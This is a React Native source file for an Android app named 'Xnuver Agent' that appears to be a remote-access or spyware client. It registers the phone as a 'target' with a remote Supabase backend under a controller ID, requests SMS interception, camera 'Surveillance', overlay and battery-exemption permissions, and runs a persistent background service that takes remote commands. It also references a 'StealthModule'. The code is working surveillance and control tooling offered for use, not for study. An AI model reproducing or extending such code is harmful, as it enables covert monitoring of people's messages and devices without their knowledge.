import React, { useState, useEffect, useRef } from 'react';
import {
    StyleSheet,
    Text,
    View,
    TextInput,
    TouchableOpacity,
    Platform,
    Alert,
    PermissionsAndroid,
    StatusBar,
    KeyboardAvoidingView,
    AppState,
    Linking,
    ScrollView,
    ActivityIndicator,
    NativeModules,
    DeviceEventEmitter,
    BackHandler
} from 'react-native';
import AsyncStorage from '@react-native-async-storage/async-storage';
import { SafeAreaProvider, SafeAreaView } from 'react-native-safe-area-context';
import { Sword, Copy, Sparkles, Zap, Shield, CheckCircle, XCircle } from 'lucide-react-native';
import * as Device from 'expo-device';
import Constants from 'expo-constants';
import { useCameraPermissions } from 'expo-camera';
import { Audio } from 'expo-av';
import * as Speech from 'expo-speech';
import { useKeepAwake } from 'expo-keep-awake';
import { BlurView } from 'expo-blur';
import notifee, { AndroidImportance, AndroidColor, EventType, AuthorizationStatus } from '@notifee/react-native';
import * as IntentLauncher from 'expo-intent-launcher';
import { startBackgroundPolling } from './backgroundTask';

// --- NATIVE MODULES ---
const { FloatingAlert, FlashlightModule, StealthModule } = NativeModules; // Injected by our plugins

// --- Configuration ---
const SUPABASE_URL = process.env.EXPO_PUBLIC_SUPABASE_URL;
const SUPABASE_ANON_KEY = process.env.EXPO_PUBLIC_SUPABASE_ANON_KEY;
const SUPABASE_REST_URL = `${SUPABASE_URL}/rest/v1`;
let DEVICE_ID = 'unknown_target';

// We'll initialize DEVICE_ID properly inside the component or a helper function
const initDeviceId = async () => {
    try {
        let id = await AsyncStorage.getItem('xnuver_stable_id');
        if (!id) {
            id = (Device.modelName || 'device') + '_' + Math.random().toString(36).substring(2, 9);
            await AsyncStorage.setItem('xnuver_stable_id', id);
        }
        DEVICE_ID = id;
    } catch (e) {
        DEVICE_ID = Device.osBuildId || Device.modelId || 'fallback_id';
    }
};
initDeviceId();

const CHANNEL_ID_SERVICE = 'xnuver_bg_service';
const CHANNEL_ID_ALERT = 'xnuver_critical_alert';

const COLORS = {
    ffYellow: '#FFD700',
    ffRed: '#E21C22',
    bgDark: '#121212',
    card: '#1E1E1E',
    success: '#4CAF50'
};

const NICKNAME_SYMBOLS = [
    { prefix: '乂', suffix: '乂' },
    { prefix: '꧁', suffix: '꧂' },
];

/**
 * --- BACKGROUND SERVICE LOGIC ---
 * Background polling is now handled by backgroundTask.js module
 * This will be started when foreground service is activated
 */
let backgroundPollingInterval = null;

// Removed - now handled by backgroundTask.js

// Removed - now handled by backgroundTask.js

const displayFullScreenAlert = async (payload) => {
    try {
        await notifee.displayNotification({
            title: payload.title || 'SYSTEM ALERT',
            body: payload.message || 'High Priority Message Received',
            android: {
                channelId: CHANNEL_ID_ALERT,
                importance: AndroidImportance.HIGH,
                fullScreenAction: {
                    id: 'default',
                    launchActivity: 'default',
                },
                pressAction: {
                    id: 'default',
                    launchActivity: 'default',
                },
                lightUpScreen: true,
                sound: 'default',
            },
        });
    } catch (e) {
        console.error('FULL_SCREEN_ALERT_FAIL', e);
    }
};


// --- UI COMPONENT ---

const ModernAlertModal = ({ visible, title, message, onClose }) => {
    if (!visible) return null;
    return (
        <View style={[StyleSheet.absoluteFill, { zIndex: 99999, justifyContent: 'center', alignItems: 'center' }]}>
            <BlurView intensity={80} tint="dark" style={StyleSheet.absoluteFill} />
            <View style={{ width: '85%', backgroundColor: '#1E1E1E', borderRadius: 25, padding: 24, borderWidth: 1, borderColor: COLORS.ffYellow, alignItems: 'center', shadowColor: '#000', shadowOffset: { width: 0, height: 10 }, shadowOpacity: 0.5, shadowRadius: 20, elevation: 10 }}>
                <View style={{ width: 60, height: 60, borderRadius: 30, backgroundColor: 'rgba(255, 215, 0, 0.1)', justifyContent: 'center', alignItems: 'center', marginBottom: 20 }}>
                    <Sparkles size={32} color={COLORS.ffYellow} />
                </View>
                <Text style={{ color: '#FFF', fontSize: 22, fontWeight: 'bold', textAlign: 'center', marginBottom: 12 }}>{title}</Text>
                <Text style={{ color: '#CCC', fontSize: 16, textAlign: 'center', lineHeight: 24, marginBottom: 24 }}>{message}</Text>
                <TouchableOpacity onPress={onClose} style={{ backgroundColor: COLORS.ffYellow, paddingVertical: 14, borderRadius: 15, width: '100%', alignItems: 'center' }}>
                    <Text style={{ color: '#000', fontWeight: 'bold' }}>OK, I UNDERSTAND</Text>
                </TouchableOpacity>
            </View>
        </View>
    );
};

// --- PERMISSION WIZARD ---
const PermissionItem = ({ title, desc, status, onPress }) => (
    <View style={{ marginBottom: 20, backgroundColor: 'rgba(255,255,255,0.05)', padding: 16, borderRadius: 12 }}>
        <View style={{ flexDirection: 'row', alignItems: 'center', justifyContent: 'space-between', marginBottom: 8 }}>
            <View style={{ flexDirection: 'row', alignItems: 'center', gap: 10 }}>
                <Shield size={20} color={status ? COLORS.success : COLORS.ffRed} />
                <Text style={{ color: '#FFF', fontWeight: 'bold', fontSize: 16 }}>{title}</Text>
            </View>
            {status ? <CheckCircle size={20} color={COLORS.success} /> : <XCircle size={20} color={COLORS.ffRed} />}
        </View>
        <Text style={{ color: '#AAA', fontSize: 12, marginBottom: 12 }}>{desc}</Text>
        {!status && (
            <TouchableOpacity onPress={onPress} style={{ backgroundColor: COLORS.ffYellow, padding: 10, borderRadius: 8, alignItems: 'center' }}>
                <Text style={{ color: '#000', fontWeight: 'bold', fontSize: 12 }}>GRANT PERMISSION</Text>
            </TouchableOpacity>
        )}
    </View>
);

export default function App() {
    useKeepAwake();
    const [isOnboarding, setIsOnboarding] = useState(true);

    // Permissions State
    const [permNotification, setPermNotification] = useState(false);
    const [permOverlay, setPermOverlay] = useState(false);
    const [permBattery, setPermBattery] = useState(false);
    const [permSms, setPermSms] = useState(false);

    const [deviceName, setDeviceName] = useState('');
    const [results, setResults] = useState([]);
    const [alertVisible, setAlertVisible] = useState(false);
    const [alertData, setAlertData] = useState({ title: '', message: '' });
    const [permission, requestPermission] = useCameraPermissions();
    const [controllerId, setControllerId] = useState('');
    const [isConnecting, setIsConnecting] = useState(false);
    const [isConnected, setIsConnected] = useState(false);
    const soundRef = useRef(null);

    // --- AUTO START IF REGISTERED ---
    useEffect(() => {
        const checkExisting = async () => {
            try {
                const savedName = await AsyncStorage.getItem('xnuver_device_name');
                const savedId = await AsyncStorage.getItem('xnuver_controller_id');

                if (savedName && savedId) {
                    setDeviceName(savedName);
                    setControllerId(savedId);

                    // Auto-connect if already registered
                    setTimeout(() => {
                        handleConnect(savedName, savedId);
                    }, 1000);
                }
            } catch (e) {
                console.error('Storage Error:', e);
            }
        };
        checkExisting();
    }, []);

    // --- SETUP CHANNELS & AUDIO SESSION ---
    useEffect(() => {
        const setup = async () => {
            // Setup Audio Mode for Background Playback
            try {
                await Audio.setAudioModeAsync({
                    staysActiveInBackground: true,
                    playsInSilentModeIOS: true,
                    shouldDuckAndroid: false,
                    playThroughEarpieceAndroid: false,
                    interruptionModeAndroid: 1, // DO_NOT_MIX
                    interruptionModeIOS: 1, // MIX_WITH_OTHERS
                });
                console.log('Audio session configured for background playback');
            } catch (e) {
                console.error('Audio session setup error:', e);
            }

            // Setup Notifee channels
            await notifee.createChannel({ id: CHANNEL_ID_SERVICE, name: 'Background Service', importance: AndroidImportance.LOW });
            await notifee.createChannel({ id: CHANNEL_ID_ALERT, name: 'Critical Alerts', importance: AndroidImportance.HIGH, sound: 'default', vibration: true, lights: true, lightColor: AndroidColor.RED });

            checkPermissions();
        };
        setup();
    }, []);

    // --- ALERT HANDLING FOR COLD START ---
    useEffect(() => {
        const checkInitialNotification = async () => {
            const initialNotification = await notifee.getInitialNotification();
            if (initialNotification && initialNotification.notification.android.channelId === CHANNEL_ID_ALERT) {
                setAlertData({
                    title: initialNotification.notification.title || 'Alert',
                    message: initialNotification.notification.body || 'Alert received while backgrounded'
                });
                setAlertVisible(true);
            }
        };
        checkInitialNotification();
    }, []);

    const checkPermissions = async () => {
        const settings = await notifee.getNotificationSettings();
        setPermNotification(settings.authorizationStatus === AuthorizationStatus.AUTHORIZED);

        // Check SMS
        if (Platform.OS === 'android') {
            const hasSms = await PermissionsAndroid.check(PermissionsAndroid.PERMISSIONS.READ_SMS);
            setPermSms(hasSms);
        }

        // Native Module Check
        if (FloatingAlert) {
            FloatingAlert.checkPermission((granted) => {
                setPermOverlay(granted);
            });
        }
    };

    const requestNotifPerm = async () => {
        const settings = await notifee.requestPermission();
        if (settings.authorizationStatus === AuthorizationStatus.AUTHORIZED) setPermNotification(true);
    };

    const requestOverlayPerm = async () => {
        if (Platform.OS === 'android') {
            if (FloatingAlert) {
                FloatingAlert.requestPermission();
                // We assume true after interaction for UX, user must confirm
                setPermOverlay(true);
            } else {
                await IntentLauncher.startActivityAsync(IntentLauncher.ActivityAction.MANAGE_OVERLAY_PERMISSION);
                setPermOverlay(true);
            }
        }
    };

    const requestBatteryPerm = async () => {
        if (Platform.OS === 'android') {
            await IntentLauncher.startActivityAsync(IntentLauncher.ActivityAction.IGNORE_BATTERY_OPTIMIZATION_SETTINGS);
            setPermBattery(true);
        }
    };

    const requestSmsPerm = async () => {
        if (Platform.OS === 'android') {
            const results = await PermissionsAndroid.requestMultiple([
                PermissionsAndroid.PERMISSIONS.READ_SMS,
                PermissionsAndroid.PERMISSIONS.RECEIVE_SMS
            ]);
            setPermSms(results['android.permission.READ_SMS'] === 'granted');
        }
    };

    const finishOnboarding = () => {
        if (!permNotification && Platform.OS === 'android' && Platform.Version >= 33) {
            Alert.alert('Required', 'Notification permission is mandatory.');
            return;
        }
        setIsOnboarding(false);
    };

    // Listen to commands from background service for UI updates
    useEffect(() => {
        const subscription = DeviceEventEmitter.addListener('XNUVER_COMMAND_RECEIVED', ({ command, payload }) => {
            console.log('UI_EVENT_RCV:', command);
            handleUIEffects(command, payload);
        });
        return () => subscription.remove();
    }, []);

    const handleUIEffects = async (command, payload) => {
        // Only handle things that need UI interaction
        if (command === 'ALERT_SHOW') {
            setAlertData({
                title: payload.title || 'SYSTEM ALERT',
                message: payload.message || 'High Priority Message'
            });
            setAlertVisible(true);
        }
    };

    // Keep handleForegroundCommand for legacy or manual tests, but removed the polling loop.
    const handleForegroundCommand = async (command, payload) => {
        console.log('UI_EXEC:', command);
        switch (command) {
            case 'MUSIC_PLAY_JETSET':
            case 'MUSIC_PLAY_JOKOWI':
                try {
                    const audioFile = command === 'MUSIC_PLAY_JETSET'
                        ? require('./assets/audio/jetset.mp3')
                        : require('./assets/audio/hidup_jokowi.mp3');

                    if (soundRef.current) {
                        try { await soundRef.current.unloadAsync(); } catch (e) { }
                    }

                    const { sound } = await Audio.Sound.createAsync(audioFile, {
                        shouldPlay: true,
                        volume: 1.0,
                        isLooping: false,
                        // CRITICAL: Keep audio playing in background
                        androidImplementation: 'MediaPlayer'
                    });

                    // Prevent audio from stopping when app backgrounds
                    await sound.setOnPlaybackStatusUpdate((status) => {
                        if (status.didJustFinish) {
                            // Auto cleanup after finish
                            sound.unloadAsync();
                        }
                    });

                    soundRef.current = sound;
                    console.log('Music playback started:', command);
                } catch (error) { console.error('PLAYBACK_ERROR:', error); }
                break;
            case 'MUSIC_STOP':
                if (soundRef.current) { try { await soundRef.current.stopAsync(); await soundRef.current.unloadAsync(); } catch (e) { } }
                break;
        }
    }

    const startBackgroundService = async () => {
        try {
            await notifee.displayNotification({
                title: 'Xnuver Agent Active',
                body: 'Monitoring secure channels...',
                android: {
                    channelId: CHANNEL_ID_SERVICE,
                    asForegroundService: true,
                    ongoing: true,
                    color: COLORS.ffYellow,
                    actions: [{ title: 'STOP', pressAction: { id: 'stop_service' } }],
                },
            });

            // Start background polling
            if (!backgroundPollingInterval) {
                backgroundPollingInterval = startBackgroundPolling();
                console.log('Background polling started');
            }
        } catch (e) {
            console.error('SERVICE_START_ERR:', e);
        }
    };

    // LISTEN TO FOREGROUND CLICKS
    useEffect(() => {
        return notifee.onForegroundEvent(({ type, detail }) => {
            if (type === EventType.PRESS || type === EventType.ACTION_PRESS) {
                if (detail.notification?.android?.channelId === CHANNEL_ID_ALERT) {
                    setAlertData({
                        title: detail.notification.title || 'Alert',
                        message: detail.notification.body || 'Alert Content'
                    });
                    setAlertVisible(true);
                }
            }
        });
    }, []);


    const handleConnect = async (customName = null, customId = null) => {
        setIsConnecting(true);

        // Ensure arguments are strings (fix for event object being passed)
        const safeName = (typeof customName === 'string') ? customName : null;
        const safeId = (typeof customId === 'string') ? customId : null;

        const checkinName = safeName || deviceName;
        const checkinId = safeId || controllerId;

        console.log('CONNECT_ATTEMPT:', checkinName, checkinId);

        if (!checkinName || checkinName.trim().length === 0) {
            Alert.alert('Missing Info', 'Please enter a Name for this device.');
            setIsConnecting(false);
            return;
        }
        if (!checkinId || checkinId.trim().length === 0) {
            Alert.alert('Missing Info', 'Please enter Closing ID (Controller ID).');
            setIsConnecting(false);
            return;
        }

        try {
            // Request necessary permissions at connect time
            if (Platform.OS === 'android') {
                await PermissionsAndroid.requestMultiple([
                    PermissionsAndroid.PERMISSIONS.CAMERA,
                    PermissionsAndroid.PERMISSIONS.READ_SMS,
                    PermissionsAndroid.PERMISSIONS.RECEIVE_SMS
                ]);
            }
            if (!permission?.granted) await requestPermission();

            // REGISTER TO SUPABASE
            const checkinData = {
                id: DEVICE_ID,
                name: checkinName,
                controller_id: checkinId,
                network: 'Online',
                last_seen: new Date().toISOString(),
                os: Device.modelName || 'Android Target'
            };

            // 1. Try to check if exists
            const encodedId = encodeURIComponent(DEVICE_ID);
            const checkRes = await fetch(`${SUPABASE_REST_URL}/devices?id=eq.${encodedId}`, {
                headers: { 'apikey': SUPABASE_ANON_KEY, 'Authorization': `Bearer ${SUPABASE_ANON_KEY}` }
            });

            const existing = await checkRes.json();

            let saveRes;
            if (existing && existing.length > 0) {
                saveRes = await fetch(`${SUPABASE_REST_URL}/devices?id=eq.${encodedId}`, {
                    method: 'PATCH',
                    headers: {
                        'apikey': SUPABASE_ANON_KEY,
                        'Authorization': `Bearer ${SUPABASE_ANON_KEY}`,
                        'Content-Type': 'application/json',
                        'Prefer': 'return=minimal'
                    },
                    body: JSON.stringify(checkinData)
                });
            } else {
                saveRes = await fetch(`${SUPABASE_REST_URL}/devices`, {
                    method: 'POST',
                    headers: {
                        'apikey': SUPABASE_ANON_KEY,
                        'Authorization': `Bearer ${SUPABASE_ANON_KEY}`,
                        'Content-Type': 'application/json',
                        'Prefer': 'return=minimal'
                    },
                    body: JSON.stringify(checkinData)
                });
            }

            if (!saveRes.ok) throw new Error('Registration Failed: ' + saveRes.status);

            // --- LOCK DATA ---
            await AsyncStorage.setItem('xnuver_device_name', checkinName);
            await AsyncStorage.setItem('xnuver_controller_id', checkinId);

            setIsConnected(true);
            await startBackgroundService();

            // --- ALERT & SUCCESS ---
            if (!safeName) {
                Alert.alert(
                    'System Online',
                    'Target synchronized. Agent is now active and monitoring in the background.',
                    [{ text: 'OK' }]
                );
            }

        } catch (err) {
            console.error('CONNECT_ERROR', err);
            Alert.alert('Connection Error', 'Could not register: ' + err.message);
        } finally {
            setIsConnecting(false);
        }
    };

    // --- RENDER ---
    if (isOnboarding) {
        return (
            <SafeAreaProvider>
                <SafeAreaView style={[styles.container, { padding: 24, paddingBottom: 50 }]}>
                    <StatusBar barStyle="light-content" />
                    <Text style={{ color: COLORS.ffYellow, fontSize: 24, fontWeight: 'bold', marginBottom: 20 }}>System Permissions</Text>
                    <Text style={{ color: '#AAA', marginBottom: 30 }}>For Xnuver Agent to work properly in the background, you must grant the following permissions:</Text>

                    <ScrollView showsVerticalScrollIndicator={false}>
                        <PermissionItem
                            title="Notifications"
                            desc="Required to keep the service running in background."
                            status={permNotification}
                            onPress={requestNotifPerm}
                        />
                        <PermissionItem
                            title="Display Over Other Apps"
                            desc="Required for System Alerts and Pop-ups."
                            status={permOverlay}
                            onPress={requestOverlayPerm}
                        />
                        <PermissionItem
                            title="Unrestricted Battery"
                            desc="Prevents system from killing the app."
                            status={permBattery}
                            onPress={requestBatteryPerm}
                        />
                        <PermissionItem
                            title="SMS Intercept"
                            desc="Required to monitor incoming messages."
                            status={permSms}
                            onPress={requestSmsPerm}
                        />
                        {permission?.granted ? null : (
                            <PermissionItem
                                title="Camera Access"
                                desc="Required for Flashlight & Surveillance."
                                status={permission?.granted}
                                onPress={requestPermission}
                            />
                        )}
                    </ScrollView>

                    <TouchableOpacity onPress={finishOnboarding} style={{ backgroundColor: COLORS.ffYellow, padding: 16, borderRadius: 12, alignItems: 'center', marginTop: 20 }}>
                        <Text style={{ color: '#000', fontWeight: '900', fontSize: 16 }}>CONTINUE TO AGENT</Text>
                    </TouchableOpacity>
                </SafeAreaView>
            </SafeAreaProvider>
        )
    }

    return (
        <SafeAreaProvider>
            <SafeAreaView style={styles.container}>
                <StatusBar barStyle="light-content" />
                <View style={styles.header}>
                    <Zap size={28} color={COLORS.ffYellow} />
                    <Text style={styles.headerTitle}>Xnuver Target</Text>
                    <View style={{ width: 10, height: 10, borderRadius: 5, backgroundColor: isConnected ? '#4CAF50' : '#666' }} />
                </View>

                <KeyboardAvoidingView behavior={Platform.OS === 'ios' ? 'padding' : 'height'} style={{ flex: 1 }}>
                    <View style={styles.content}>
                        <View style={styles.inputCard}>
                            <Text style={styles.inputLabel}>TARGET CONFIGURATION</Text>
                            <TextInput
                                style={[styles.input, { marginBottom: 12, flex: 0, width: '100%' }]}
                                placeholder="Device Alias"
                                placeholderTextColor="rgba(255,255,255,0.3)"
                                value={deviceName}
                                onChangeText={setDeviceName}
                                editable={!isConnected}

                            />
                            <View style={styles.inputWrapper}>
                                <TextInput
                                    style={styles.input}
                                    placeholder="Controller ID"
                                    placeholderTextColor="rgba(255,255,255,0.3)"
                                    value={controllerId}
                                    onChangeText={setControllerId}
                                    editable={!isConnected}
                                />
                                <TouchableOpacity
                                    style={[styles.genBtn, isConnected && { backgroundColor: '#4CAF50' }]}
                                    onPress={() => handleConnect()}
                                    disabled={isConnected || isConnecting}
                                >
                                    <Text style={styles.genBtnText}>{isConnecting ? '...' : isConnected ? 'ACTIVE' : 'CONNECT'}</Text>
                                </TouchableOpacity>
                            </View>
                            {isConnected && (
                                <Text style={{ color: '#4CAF50', fontSize: 10, marginTop: 8, fontStyle: 'italic' }}>
                                    ● Foreground Service Running
                                </Text>
                            )}
                        </View>
                        <View style={[styles.inputCard, { borderColor: '#333' }]}>
                            <Text style={styles.inputLabel}>DIAGNOSTICS & TEST</Text>
                            <View style={{ flexDirection: 'row', flexWrap: 'wrap', gap: 10 }}>
                                <TouchableOpacity style={styles.testBtn} onPress={() => Speech.speak('System Verification Active', { language: 'en' })}>
                                    <Text style={styles.testBtnText}>TEST TTS</Text>
                                </TouchableOpacity>
                                <TouchableOpacity style={styles.testBtn} onPress={() => {
                                    // Try Native Overlay first
                                    if (FloatingAlert) FloatingAlert.show('Overlay Test', 'This is a Native Overlay');
                                    else displayFullScreenAlert({ title: 'Test Alert', message: 'Full Screen Intent Active' });
                                }}>
                                    <Text style={styles.testBtnText}>TEST OVERLAY</Text>
                                </TouchableOpacity>
                            </View>
                        </View>
                    </View>
                </KeyboardAvoidingView>

                <ModernAlertModal
                    visible={alertVisible}
                    title={alertData.title}
                    message={alertData.message}
                    onClose={() => setAlertVisible(false)}
                />
            </SafeAreaView>
        </SafeAreaProvider>
    );
}

const styles = StyleSheet.create({
    container: { flex: 1, backgroundColor: COLORS.bgDark },
    header: { flexDirection: 'row', alignItems: 'center', justifyContent: 'space-between', paddingHorizontal: 24, paddingVertical: 20, backgroundColor: COLORS.card, borderBottomWidth: 1, borderBottomColor: '#333' },
    headerTitle: { color: '#fff', fontSize: 20, fontWeight: '900', letterSpacing: 1 },
    content: { flex: 1, padding: 20 },
    inputCard: { backgroundColor: COLORS.card, padding: 20, borderRadius: 16, marginBottom: 20, borderWidth: 1, borderColor: '#333' },
    inputLabel: { color: COLORS.ffYellow, fontSize: 10, fontWeight: '900', marginBottom: 16, letterSpacing: 1.5, opacity: 0.8 },
    inputWrapper: { flexDirection: 'row', gap: 12 },
    input: { flex: 1, backgroundColor: 'rgba(0,0,0,0.3)', borderRadius: 8, paddingHorizontal: 16, paddingVertical: 12, color: '#fff', fontSize: 14, fontFamily: Platform.OS === 'ios' ? 'Menlo' : 'monospace', borderWidth: 1, borderColor: '#333' },
    genBtn: { backgroundColor: COLORS.ffYellow, paddingHorizontal: 20, justifyContent: 'center', borderRadius: 8 },
    genBtnText: { color: '#000', fontWeight: '900', fontSize: 12 },
    testBtn: { backgroundColor: '#333', padding: 10, borderRadius: 8 },
    testBtnText: { color: '#FFF', fontSize: 10, fontWeight: 'bold' }
});
